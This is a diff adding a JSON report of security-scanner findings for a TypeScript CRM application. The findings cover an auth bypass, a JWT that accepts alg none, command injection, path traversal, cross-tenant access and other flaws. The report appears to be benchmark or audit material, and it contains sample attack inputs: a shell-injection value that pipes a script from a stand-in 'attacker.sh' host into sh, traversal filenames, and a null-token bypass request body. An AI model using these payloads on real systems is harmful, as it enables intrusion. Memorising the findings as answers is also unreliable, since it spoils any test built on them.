@@ -1,0 +1,776 @@
+{
+  "version": "1.0.0",
+  "results": [
+    {
+      "check_id": "typescript.security.auth.password-reset-without-token",
+      "path": "backend/src/auth/auth.service.ts",
+      "start": {
+        "line": 244,
+        "col": 5,
+        "offset": 8893
+      },
+      "end": {
+        "line": 253,
+        "col": 8,
+        "offset": 9255
+      },
+      "extra": {
+        "message": "The public endpoint POST /api/auth/reset-password/email-fallback (auth.controller.ts:61-65, decorated @Public()) calls confirmResetByEmailFallback, which resets the password of ANY account given only its email address. No reset token, secret, or prior authentication is required \u2014 the supplied email is the sole account selector. An attacker who knows (or guesses) a victim's email, including the platform admin's, can set a new password and take over the account, completely bypassing the token-based reset flow.",
+        "severity": "ERROR",
+        "metadata": {
+          "cwe": [
+            "CWE-640: Weak Password Recovery Mechanism for Forgotten Password",
+            "CWE-287: Improper Authentication"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "typescript.security.jwt.alg-none-allowed",
+      "path": "backend/src/organizations/organizations.service.ts",
+      "start": {
+        "line": 302,
+        "col": 7,
+        "offset": 8798
+      },
+      "end": {
+        "line": 304,
+        "col": 41,
+        "offset": 8928
+      },
+      "extra": {
+        "message": "processAllocation (exposed as public GET /api/organizations/:id/cost-allocation, organizations.controller.ts:91-99) verifies a partner JWT with algorithms: ['HS256', 'none']. Allowing the 'none' algorithm means an attacker can craft a token with alg:none and an empty signature that passes verification, since no signature check is performed for that algorithm. This bypasses authentication on the public endpoint and discloses the organization's cost allocation (derived from annualRevenue).",
+        "severity": "ERROR",
+        "metadata": {
+          "cwe": [
+            "CWE-347: Improper Verification of Cryptographic Signature",
+            "CWE-287: Improper Authentication"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "typescript.secrets.hardcoded-jwt-secret-fallback",
+      "path": "backend/src/auth/jwt.strategy.ts",
+      "start": {
+        "line": 24,
+        "col": 7,
+        "offset": 720
+      },
+      "end": {
+        "line": 24,
+        "col": 88,
+        "offset": 807
+      },
+      "extra": {
+        "message": "The JWT signing/verification secret falls back to the hardcoded string 'crm-jwt-secret-key-change-in-production' when JWT_SECRET is not set. This default is embedded in source and therefore known to anyone with repo access, allowing full forging of authentication tokens (any user id, any role including platform_admin). The same hardcoded fallback is repeated in auth.module.ts:11, organizations.service.ts:301, documents.service.ts:206/215/241, and webhooks.service.ts:173/188/216.",
+        "severity": "ERROR",
+        "metadata": {
+          "cwe": [
+            "CWE-798: Use of Hard-coded Credentials",
+            "CWE-321: Use of Hard-coded Cryptographic Key"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "typescript.security.filesystem.path-traversal-file-upload",
+      "path": "backend/src/organizations/organizations.service.ts",
+      "start": {
+        "line": 390,
+        "col": 24,
+        "offset": 11841
+      },
+      "end": {
+        "line": 391,
+        "col": 45,
+        "offset": 11952
+      },
+      "extra": {
+        "message": "uploadLogo writes an uploaded file to path.join(publicLogosDir, file.originalname) using the client-controlled multipart filename without any sanitization. A filename such as '../../../backend/src/evil.js' escapes the public/logos directory, enabling arbitrary file write anywhere the process can write (arbitrary file overwrite/modification). Additionally there is no MIME/extension validation, so writing HTML/JS files into the public asset directory also enables stored XSS served to other users. Contrast with contacts.service.ts uploadAvatar, which correctly generates a random UUID filename.",
+        "severity": "ERROR",
+        "metadata": {
+          "cwe": [
+            "CWE-22: Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal')"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "typescript.security.filesystem.path-traversal-file-write",
+      "path": "backend/src/escalations/escalations.service.ts",
+      "start": {
+        "line": 455,
+        "col": 32,
+        "offset": 15263
+      },
+      "end": {
+        "line": 456,
+        "col": 22,
+        "offset": 15352
+      },
+      "extra": {
+        "message": "archiveEngagementPacket writes the JSON archive to path.join(packetDir, `${packetLabel}.json`) where packetLabel comes directly from the request body (POST /api/escalations/:id/packet) with no sanitization. A label like '../../../../etc/evil' escapes the engagement-packets directory and writes an attacker-influenced .json file to an arbitrary location (e.g. overwriting package.json or config files with JSON content the attacker partially controls via the payload field). Contrast with deals.service.ts archiveRenewalBrief which sanitizes with path.basename.",
+        "severity": "ERROR",
+        "metadata": {
+          "cwe": [
+            "CWE-22: Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal')"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "typescript.security.injection.command-injection",
+      "path": "backend/src/documents/documents.service.ts",
+      "start": {
+        "line": 286,
+        "col": 21,
+        "offset": 9849
+      },
+      "end": {
+        "line": 289,
+        "col": 31,
+        "offset": 10064
+      },
+      "extra": {
+        "message": "convertToExportFormat builds a shell command by string interpolation and passes it to exec(): `soffice --headless --convert-to ${exportFormat} --outdir ... ${srcPath}`. exportFormat is taken verbatim from the request body (POST /api/documents/:id/convert) with no whitelist or escaping, so any authenticated user who can view a document can inject shell metacharacters (e.g. exportFormat='pdf; curl attacker.sh | sh' or '$(id)') and achieve arbitrary remote command execution as the server process.",
+        "severity": "ERROR",
+        "metadata": {
+          "cwe": [
+            "CWE-78: Improper Neutralization of Special Elements used in an OS Command ('OS Command Injection')",
+            "CWE-77: Command Injection"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "typescript.security.auth.null-token-comparison-bypass",
+      "path": "backend/src/contacts/contacts.service.ts",
+      "start": {
+        "line": 289,
+        "col": 9,
+        "offset": 8575
+      },
+      "end": {
+        "line": 291,
+        "col": 6,
+        "offset": 8706
+      },
+      "extra": {
+        "message": "activatePortalAccess (public POST /api/contacts/portal/activate) validates the invite with 'contact.inviteToken !== inviteToken'. The inviteToken body field is read raw (no DTO validation), and contacts that were never invited have inviteToken = NULL (contact.entity.ts:35-36). Sending {\"email\":\"victim@x\",\"inviteToken\":null} makes both sides null, the strict inequality evaluates false, and the check passes \u2014 letting an unauthenticated attacker 'activate' portal access for any contact without a valid invite token.",
+        "severity": "ERROR",
+        "metadata": {
+          "cwe": [
+            "CWE-287: Improper Authentication",
+            "CWE-306: Missing Authentication for Critical Function"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "typescript.security.auth.null-token-comparison-bypass-session",
+      "path": "backend/src/contacts/contacts.service.ts",
+      "start": {
+        "line": 337,
+        "col": 36,
+        "offset": 10291
+      },
+      "end": {
+        "line": 339,
+        "col": 6,
+        "offset": 10434
+      },
+      "extra": {
+        "message": "beginPortalSession (public POST /api/contacts/portal/session) contains the same flawed check: '!contact || contact.inviteToken !== inviteToken'. Passing inviteToken: null for a contact that has never been invited (inviteToken NULL in DB) satisfies the comparison and lets an unauthenticated attacker establish a portal session bound to that contact's identity (userId) with CUSTOMER_CONTACT role, bypassing the invite-token authentication entirely.",
+        "severity": "ERROR",
+        "metadata": {
+          "cwe": [
+            "CWE-287: Improper Authentication",
+            "CWE-306: Missing Authentication for Critical Function"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "typescript.security.authorization.sharing-scope-permission-bypass",
+      "path": "backend/src/contacts/contacts.service.ts",
+      "start": {
+        "line": 260,
+        "col": 9,
+        "offset": 7604
+      },
+      "end": {
+        "line": 263,
+        "col": 6,
+        "offset": 7753
+      },
+      "extra": {
+        "message": "adjustSharingScope skips checkModifyPermission entirely when sharingMode === 'partner_shared', writing the new sharing mode to any contact without verifying the caller owns or belongs to the contact's organization. The corresponding controller route PUT /api/contacts/:id/sharing-scope (contacts.controller.ts:89-96) has no @Roles restriction, so any authenticated user (including customer contacts of other tenants) can flip any contact to partner_shared, changing the contact's cross-team data-sharing exposure without authorization.",
+        "severity": "WARNING",
+        "metadata": {
+          "cwe": [
+            "CWE-862: Missing Authorization",
+            "CWE-285: Improper Authorization"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "typescript.security.authorization.tenant-filter-override",
+      "path": "backend/src/contacts/contacts.service.ts",
+      "start": {
+        "line": 309,
+        "col": 36,
+        "offset": 9365
+      },
+      "end": {
+        "line": 312,
+        "col": 28,
+        "offset": 9514
+      },
+      "extra": {
+        "message": "runSavedSegment merges the role-based tenant filter with user-supplied criteria as { ...roleWhere, ...criteria }. Because criteria is spread last, any key the caller supplies \u2014 including organizationId \u2014 overrides the role scoping. A CUSTOMER_CONTACT can POST /api/contacts/segments/run with criteria {\"organizationId\":\"<other-org-uuid>\"} and read contacts of another tenant, breaking tenant isolation. The criteria object is also passed unvalidated into the TypeORM where clause.",
+        "severity": "WARNING",
+        "metadata": {
+          "cwe": [
+            "CWE-863: Incorrect Authorization",
+            "CWE-284: Improper Access Control"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "typescript.security.authorization.cross-tenant-contact-modify",
+      "path": "backend/src/contacts/contacts.service.ts",
+      "start": {
+        "line": 77,
+        "col": 9,
+        "offset": 2227
+      },
+      "end": {
+        "line": 81,
+        "col": 16,
+        "offset": 2506
+      },
+      "extra": {
+        "message": "checkModifyPermission returns unconditionally for ACCOUNT_MANAGER users ('We'd need to check ownerId on the organization, but we just check they can access it'), so any account manager can update, delete, or invite for contacts belonging to ANY organization, not just the organizations they own. The organizations module properly scopes account managers by ownerId (organizations.service.ts:73-79), making this missing check an inconsistent cross-tenant access control flaw.",
+        "severity": "WARNING",
+        "metadata": {
+          "cwe": [
+            "CWE-284: Improper Access Control",
+            "CWE-862: Missing Authorization"
+          ],
+          "confidence": "MEDIUM",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "typescript.security.access-control.webhook-idor",
+      "path": "backend/src/webhooks/webhooks.service.ts",
+      "start": {
+        "line": 43,
+        "col": 3,
+        "offset": 1332
+      },
+      "end": {
+        "line": 49,
+        "col": 4,
+        "offset": 1582
+      },
+      "extra": {
+        "message": "findOne performs no ownership or tenant check \u2014 it looks the webhook up purely by id and returns the full entity, including the signing secret column. The route is only role-gated to ACCOUNT_MANAGER/PLATFORM_ADMIN (webhooks.controller.ts:46-53), so any account manager can read (including the webhook secret), update (e.g. redirect the delivery URL), or delete (webhooks.controller.ts:55-73) any other tenant's webhook by id. findAll(organizationId) similarly accepts any organization id without verifying the caller's association with it.",
+        "severity": "WARNING",
+        "metadata": {
+          "cwe": [
+            "CWE-639: Authorization Bypass Through User-Controlled Key",
+            "CWE-200: Exposure of Sensitive Information"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "typescript.security.info.stack-trace-disclosure",
+      "path": "backend/src/health/dashboard.service.ts",
+      "start": {
+        "line": 119,
+        "col": 9,
+        "offset": 4064
+      },
+      "end": {
+        "line": 128,
+        "col": 6,
+        "offset": 4314
+      },
+      "extra": {
+        "message": "compileRenewalForecast returns (err as Error).stack, err.message, and the user's email to the client when reportLevel=full is passed in the query string (GET /api/dashboard/renewal-forecast). Any authenticated user can trigger an exception (e.g. an organization with a null renewalDate causes renewalDate.getFullYear() to throw) and receive full server stack traces, disclosing internal file paths, library versions, and implementation details.",
+        "severity": "WARNING",
+        "metadata": {
+          "cwe": [
+            "CWE-209: Generation of Error Message Containing Sensitive Information"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "typescript.security.authorization.dashboard-data-exposure",
+      "path": "backend/src/health/dashboard.service.ts",
+      "start": {
+        "line": 64,
+        "col": 5,
+        "offset": 2383
+      },
+      "end": {
+        "line": 89,
+        "col": 24,
+        "offset": 3086
+      },
+      "extra": {
+        "message": "getStats (GET /api/dashboard/stats) only applies role-based filtering to the totalOrganizations count. The remaining payload \u2014 recentActivity (last 10 audit log entries containing actor emails, actions, target ids and metadata), upcomingRenewals (full organization entities including annualRevenue, notes, renewalDate), dealsByStage and healthScore aggregates \u2014 is returned unscoped to ANY authenticated user. Since registration is public, anyone can register and immediately read audit-log data and financial details of every tenant.",
+        "severity": "WARNING",
+        "metadata": {
+          "cwe": [
+            "CWE-862: Missing Authorization",
+            "CWE-200: Exposure of Sensitive Information to an Unauthorized Actor"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "typescript.security.auth.predictable-delegate-confirmation-code",
+      "path": "backend/src/organizations/organizations.service.ts",
+      "start": {
+        "line": 327,
+        "col": 5,
+        "offset": 9765
+      },
+      "end": {
+        "line": 331,
+        "col": 76,
+        "offset": 10056
+      },
+      "extra": {
+        "message": "confirmDelegateAccess (public POST /api/organizations/delegate-access/confirm) derives the 'confirmation code' deterministically from non-secret data: `${org.id.slice(0, 8)}-${org.planTier}`. Both values are visible to every member of the organization (org id and plan tier are returned by normal authenticated org endpoints), so a customer contact can compute the code for their own organization and use this unauthenticated path to disclose the organization's annualRevenue \u2014 financial data they are not authorized to see via any other endpoint.",
+        "severity": "WARNING",
+        "metadata": {
+          "cwe": [
+            "CWE-330: Use of Insufficiently Random Values",
+            "CWE-200: Exposure of Sensitive Information to an Unauthorized Actor"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "typescript.security.injection.http-header-injection",
+      "path": "backend/src/deals/deals.service.ts",
+      "start": {
+        "line": 401,
+        "col": 9,
+        "offset": 13313
+      },
+      "end": {
+        "line": 403,
+        "col": 20,
+        "offset": 13469
+      },
+      "extra": {
+        "message": "exportRenewalSummary places the user-supplied documentTitle query parameter (GET /api/deals/:id/renewal-summary) directly into the Content-Disposition header: `attachment; filename=\"${title}.json\"` without any sanitization. Unlike exportContactCard (contacts.service.ts:422) which strips CR/LF characters, this allows control characters and quote characters from user input into a response header (HTTP response splitting/header injection on platforms that permit them, and header-parameter injection otherwise).",
+        "severity": "WARNING",
+        "metadata": {
+          "cwe": [
+            "CWE-113: HTTP Response Splitting",
+            "CWE-644: HTTP Header Injection"
+          ],
+          "confidence": "MEDIUM",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "typescript.security.mass-assignment",
+      "path": "backend/src/deals/deals.service.ts",
+      "start": {
+        "line": 332,
+        "col": 5,
+        "offset": 11148
+      },
+      "end": {
+        "line": 340,
+        "col": 58,
+        "offset": 11442
+      },
+      "extra": {
+        "message": "applyBulkAdjustment parses the raw multipart 'adjustment' string as JSON and applies it to the deal via Object.assign(deal, adjustment) with no field whitelist or DTO validation. Any deal property can be overwritten by an ACCOUNT_MANAGER/PLATFORM_ADMIN, including organizationId (moving a deal between tenants), ownerId, id, and audit-relevant fields. Contrast with escalations.service.ts applyIntakeForm, which validates its JSON payload through a strict DTO.",
+        "severity": "WARNING",
+        "metadata": {
+          "cwe": [
+            "CWE-915: Improperly Controlled Modification of Dynamically-Determined Object Attributes"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "typescript.security.exposure.api-key-in-url-over-http",
+      "path": "backend/src/webhooks/webhooks.service.ts",
+      "start": {
+        "line": 104,
+        "col": 7,
+        "offset": 3549
+      },
+      "end": {
+        "line": 111,
+        "col": 7,
+        "offset": 3857
+      },
+      "extra": {
+        "message": "syncBillingRecord sends the BILLING_SYNC_KEY API credential as a URL query parameter (http://${billingHost}/sync?api_key=...) over plaintext HTTP. The key is exposed in transit to network observers, in proxy/server access logs, and in process listings. Contrast with syncCrmRecord on the next lines, which correctly sends the credential as an Authorization header over HTTPS.",
+        "severity": "WARNING",
+        "metadata": {
+          "cwe": [
+            "CWE-319: Cleartext Transmission of Sensitive Information",
+            "CWE-598: Use of GET Request Method With Sensitive Query Strings"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "typescript.security.cors.origin-reflection",
+      "path": "backend/src/webhooks/webhooks.controller.ts",
+      "start": {
+        "line": 143,
+        "col": 7,
+        "offset": 4148
+      },
+      "end": {
+        "line": 147,
+        "col": 6,
+        "offset": 4309
+      },
+      "extra": {
+        "message": "getPartnerSchema reflects the caller-supplied Origin header verbatim into the Access-Control-Allow-Origin response header, allowing any origin to read the endpoint cross-origin. Contrast with api-keys.controller.ts getExplorerSchema, which validates the origin against an allowlist before reflecting it. The reflected origin currently only exposes a public static schema, but the pattern permits arbitrary origins and becomes dangerous if any credential-bearing or data-bearing endpoint copies it.",
+        "severity": "INFO",
+        "metadata": {
+          "cwe": [
+            "CWE-942: Permissive Cross-domain Policy with Untrusted Domains",
+            "CWE-346: Origin Validation Error"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "typescript.security.authorization.preview-link-no-access-check",
+      "path": "backend/src/documents/documents.service.ts",
+      "start": {
+        "line": 205,
+        "col": 3,
+        "offset": 6570
+      },
+      "end": {
+        "line": 209,
+        "col": 4,
+        "offset": 6868
+      },
+      "extra": {
+        "message": "issuePreviewLink signs a preview token for documentId without loading the document or calling checkAccess, so any ACCOUNT_MANAGER can mint preview links for documents of ANY organization, including internal and billing-only documents of other tenants. resolvePreviewLink (line 214-228) is a @Public endpoint that resolves these tokens with ignoreExpiration: true, returning the full document record (name, fileName, filePath, visibility, organizationId) to unauthenticated holders of the link, with no expiry.",
+        "severity": "WARNING",
+        "metadata": {
+          "cwe": [
+            "CWE-862: Missing Authorization",
+            "CWE-200: Exposure of Sensitive Information to an Unauthorized Actor"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "typescript.security.crypto.unauthenticated-cbc-padding-oracle",
+      "path": "backend/src/documents/documents.service.ts",
+      "start": {
+        "line": 246,
+        "col": 7,
+        "offset": 8213
+      },
+      "end": {
+        "line": 255,
+        "col": 6,
+        "offset": 8739
+      },
+      "extra": {
+        "message": "restoreLegacyExportRecord decrypts attacker-supplied ciphertext with AES-256-CBC (unauthenticated) and returns distinguishable error messages based on the failure mode \u2014 'Legacy archive padding is invalid for this key' when the padding check fails vs 'Legacy archive could not be decrypted' otherwise. This distinction is observable to callers and constitutes a padding oracle that can be used to decrypt any data encrypted under this key without knowing it. Contrast with webhooks.service.ts restoreRotationBundle, which correctly uses authenticated AES-256-GCM with a single generic error.",
+        "severity": "WARNING",
+        "metadata": {
+          "cwe": [
+            "CWE-327: Use of a Broken or Risky Cryptographic Algorithm",
+            "CWE-310: Cryptographic Issues"
+          ],
+          "confidence": "MEDIUM",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "typescript.security.logging.password-reset-token-logged",
+      "path": "backend/src/auth/auth.service.ts",
+      "start": {
+        "line": 96,
+        "col": 5,
+        "offset": 3411
+      },
+      "end": {
+        "line": 97,
+        "col": 71,
+        "offset": 3522
+      },
+      "extra": {
+        "message": "forgotPassword logs the raw password reset token to the console: console.log(`[PASSWORD RESET] Token for ${email}: ${resetToken}`). Anyone with access to logs (ops staff, log aggregation systems, or a compromised log store) can hijack the password reset flow for any user who requests a reset within the token's 1-hour validity window.",
+        "severity": "INFO",
+        "metadata": {
+          "cwe": [
+            "CWE-532: Insertion of Sensitive Information into Log File"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "typescript.security.logging.invite-token-logged",
+      "path": "backend/src/contacts/contacts.service.ts",
+      "start": {
+        "line": 227,
+        "col": 5,
+        "offset": 6604
+      },
+      "end": {
+        "line": 230,
+        "col": 7,
+        "offset": 6797
+      },
+      "extra": {
+        "message": "inviteContact logs the raw portal invite token to the console together with the contact's email and organization id. The invite token is the only credential protecting the public portal activation/session endpoints, so its presence in logs exposes every invited contact's portal access to anyone who can read server logs.",
+        "severity": "INFO",
+        "metadata": {
+          "cwe": [
+            "CWE-532: Insertion of Sensitive Information into Log File"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "typescript.secrets.hardcoded-db-credentials-fallback",
+      "path": "backend/src/config/database.config.ts",
+      "start": {
+        "line": 10,
+        "col": 3,
+        "offset": 281
+      },
+      "end": {
+        "line": 11,
+        "col": 55,
+        "offset": 386
+      },
+      "extra": {
+        "message": "Database connection falls back to hardcoded credentials ('crm_user' / 'crm_password') when DB_USERNAME/DB_PASSWORD environment variables are not set. Anyone with access to the source knows valid default database credentials, and deployments that omit the variables silently run with a well-known username/password pair.",
+        "severity": "INFO",
+        "metadata": {
+          "cwe": [
+            "CWE-798: Use of Hard-coded Credentials"
+          ],
+          "confidence": "MEDIUM",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "typescript.security.tls.certificate-validation-disabled",
+      "path": "backend/src/config/database.config.ts",
+      "start": {
+        "line": 18,
+        "col": 3,
+        "offset": 679
+      },
+      "end": {
+        "line": 18,
+        "col": 78,
+        "offset": 756
+      },
+      "extra": {
+        "message": "When DB_SSL=true, the Postgres connection is configured with ssl: { rejectUnauthorized: false }, which disables TLS certificate verification. This makes the encrypted database connection vulnerable to man-in-the-middle interception (the certificate of any attacker-controlled host would be accepted).",
+        "severity": "INFO",
+        "metadata": {
+          "cwe": [
+            "CWE-295: Improper Certificate Validation"
+          ],
+          "confidence": "MEDIUM",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "typescript.security.cookies.missing-security-flags-workspace-context",
+      "path": "backend/src/organizations/organizations.controller.ts",
+      "start": {
+        "line": 146,
+        "col": 5,
+        "offset": 4313
+      },
+      "end": {
+        "line": 148,
+        "col": 20,
+        "offset": 4488
+      },
+      "extra": {
+        "message": "switchWorkspaceContext sets the workspaceContext cookie with only maxAge and path \u2014 no Secure, HttpOnly, or SameSite attributes. The token (userId:organizationId) is transmitted in cleartext over HTTP, readable by JavaScript (XSS-exfiltratable), and sent cross-site. Contrast with escalations.controller.ts switchQueueContext, which correctly sets secure, httpOnly, and sameSite: strict.",
+        "severity": "INFO",
+        "metadata": {
+          "cwe": [
+            "CWE-614: Sensitive Cookie in HTTPS Session Without 'Secure' Attribute",
+            "CWE-1004: Sensitive Cookie Without 'HttpOnly' Flag"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "typescript.security.cookies.missing-security-flags-digest-context",
+      "path": "backend/src/health/dashboard.controller.ts",
+      "start": {
+        "line": 33,
+        "col": 5,
+        "offset": 1124
+      },
+      "end": {
+        "line": 35,
+        "col": 19,
+        "offset": 1297
+      },
+      "extra": {
+        "message": "openRenewalDigest sets the digestContext cookie containing the caller's user id with no Secure, HttpOnly, or SameSite attributes, exposing it to interception over unencrypted connections, JavaScript access, and cross-site requests.",
+        "severity": "INFO",
+        "metadata": {
+          "cwe": [
+            "CWE-614: Sensitive Cookie in HTTPS Session Without 'Secure' Attribute",
+            "CWE-1004: Sensitive Cookie Without 'HttpOnly' Flag"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "typescript.security.cookies.missing-secure-flag-console-session",
+      "path": "backend/src/api-keys/api-keys.controller.ts",
+      "start": {
+        "line": 110,
+        "col": 5,
+        "offset": 3214
+      },
+      "end": {
+        "line": 112,
+        "col": 63,
+        "offset": 3447
+      },
+      "extra": {
+        "message": "openConsoleSession sets the consoleSessionId cookie with httpOnly and maxAge but omits the Secure and SameSite attributes, so the API-explorer session token is transmitted in cleartext over HTTP and is attached to cross-site requests.",
+        "severity": "INFO",
+        "metadata": {
+          "cwe": [
+            "CWE-614: Sensitive Cookie in HTTPS Session Without 'Secure' Attribute"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "typescript.security.storage.jwt-in-localstorage",
+      "path": "frontend/src/app/core/services/auth.service.ts",
+      "start": {
+        "line": 56,
+        "col": 9,
+        "offset": 1581
+      },
+      "end": {
+        "line": 57,
+        "col": 73,
+        "offset": 1718
+      },
+      "extra": {
+        "message": "The JWT access token is persisted in localStorage. Unlike HttpOnly cookies, localStorage is fully readable by JavaScript, so any XSS on the page allows an attacker to steal the bearer token and impersonate the user. Tokens also remain after logout-timeouts unless explicitly cleared.",
+        "severity": "INFO",
+        "metadata": {
+          "cwe": [
+            "CWE-522: Insufficiently Protected Credentials",
+            "CWE-922: Insecure Storage of Sensitive Information"
+          ],
+          "confidence": "MEDIUM",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "typescript.security.injection.server-side-template-injection",
+      "path": "backend/src/notifications/notifications.service.ts",
+      "start": {
+        "line": 91,
+        "col": 26,
+        "offset": 2769
+      },
+      "end": {
+        "line": 92,
+        "col": 48,
+        "offset": 2874
+      },
+      "extra": {
+        "message": "previewCustomSegmentMessage compiles a user-supplied messageTemplate with Handlebars.compile() and executes it server-side (POST /api/notifications/segment-message/preview). Passing untrusted template source to a template engine is a server-side template injection vector; vulnerable Handlebars versions permit escape into arbitrary code execution, and even patched versions execute attacker-chosen template logic against the provided data. Contrast with renderRenewalDigestMessage, which compiles only a fixed constant template.",
+        "severity": "WARNING",
+        "metadata": {
+          "cwe": [
+            "CWE-94: Improper Control of Generation of Code ('Code Injection')",
+            "CWE-1336: Improper Neutralization of Special Elements Used in a Template Engine"
+          ],
+          "confidence": "MEDIUM",
+          "category": "security"
+        }
+      }
+    }
+  ]
+}
